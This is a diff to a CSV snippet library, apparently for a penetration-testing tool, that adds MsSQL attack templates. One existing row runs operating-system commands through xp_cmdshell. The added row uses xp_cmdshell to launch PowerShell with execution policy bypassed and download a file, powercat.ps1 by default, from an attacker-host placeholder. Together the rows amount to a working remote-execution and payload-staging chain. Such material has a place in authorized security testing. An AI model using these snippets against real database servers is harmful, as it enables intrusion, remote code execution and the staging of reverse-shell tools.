@@ -1,2 +1,3 @@
 name,description,snippet,variables
 MsSQLExecuteCommand,MsSQL comamnd execution via xp_cmdshell,"xp_cmdshell '§§§command§§§';",§§§command§whoami§command that should be executed§§§
+MsSQLExecuteCommandPsDownload,MsSQL comamnd execution via xp_cmdshell (download file via powershell),"xp_cmdshell 'powershell -ep bypass -nop iwr -uri ###HttpUri###§§§file§§§ -outfile §§§file§§§';",§§§file§powercat.ps1§filename to download from host§§§
